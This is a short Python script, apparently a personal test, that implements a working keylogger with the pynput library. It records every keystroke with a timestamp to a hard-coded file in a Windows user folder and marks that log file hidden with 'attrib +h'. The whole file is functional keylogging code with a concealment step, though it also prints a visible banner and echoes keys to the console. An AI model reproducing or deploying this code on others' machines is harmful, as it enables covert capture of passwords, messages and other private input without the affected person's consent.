from pynput.keyboard import Listener, Key
import os
import time

log_file = r"C:\Users\Shahriar\Testlog.txt"

print("=" * 50)
print("KEYLOGGER STARTED")
print(f"Log file: {log_file}")
print("Press Ctrl+C to stop")
print("=" * 50)

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        if key == Key.space:
            key_str = " "
        elif key == Key.enter:
            key_str = "\n"
        elif key == Key.backspace:
            key_str = "[BACKSPACE]"
        else:
            key_str = f"[{key}]"
    
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{time.ctime()}] {key_str}")
        print(f"✓ {key_str}", end="", flush=True)
    except Exception as e:
        print(f"\n✗ Error: {e}")

# Create file if it doesn't exist
if not os.path.exists(log_file):
    open(log_file, "w").close()
    print("✓ Log file created\n")

# Hide file (Windows only)
try:
    os.system(f'attrib +h "{log_file}"')
except:
    pass


try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n\n✓ Keylogger stopped!")
    print(f"Check file: {log_file}")
